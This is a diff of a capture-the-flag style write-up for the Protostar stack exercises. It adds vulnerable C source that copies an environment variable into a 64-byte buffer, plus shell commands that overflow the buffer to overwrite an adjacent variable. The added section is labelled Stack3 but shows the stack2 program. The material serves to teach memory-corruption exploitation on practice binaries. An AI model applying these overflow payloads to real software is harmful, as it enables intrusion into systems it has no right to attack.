@@ -1,4 +1,4 @@
-# Writeup: Stack0-3
+# Writeup Protostar2: Stack
 
 Check ASLR:
 ```bash
@@ -157,4 +157,46 @@ We can directly input it as an argument to gdb's `run` command:
 (gdb) run $(python -c "import sys; sys.stdout.write(b'\x41' * 64 + b'\x64\x63\x62\x61')")
 Starting program: /opt/protostar/bin/stack1 $(python -c "import sys; sys.stdout.write(b'\x41' * 64 + b'\x64\x63\x62\x61')")
 you have correctly got the variable to the right value
+```
+
+## Stack3
+
+```c
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char **argv)
+{
+  volatile int modified;
+  char buffer[64];
+  char *variable;
+
+  variable = getenv("GREENIE");
+
+  if(variable == NULL) {
+      errx(1, "please set the GREENIE environment variable\n");
+  }
+
+  modified = 0;
+
+  strcpy(buffer, variable);
+
+  if(modified == 0x0d0a0d0a) {
+      printf("you have correctly modified the variable\n");
+  } else {
+      printf("Try again, you got 0x%08x\n", modified);
+  }
+
+}
+```
+
+This time we can control the input via an environment variable. We can set an environment variable via `export`. We can use `printenv` to make sure that the variable is set correctly and that it is an environment variable and not a shell variable. Shell variables won't work here.
+
+```bash
+$ export GREENIE=$(python -c "import sys; sys.stdout.write(b'\x41' * 64 + b'\x0A\x0D\x0A\x0D')")
+$ printenv GREENIE
+$ ./stack3
+$ you have correctly modified the variable
 ```
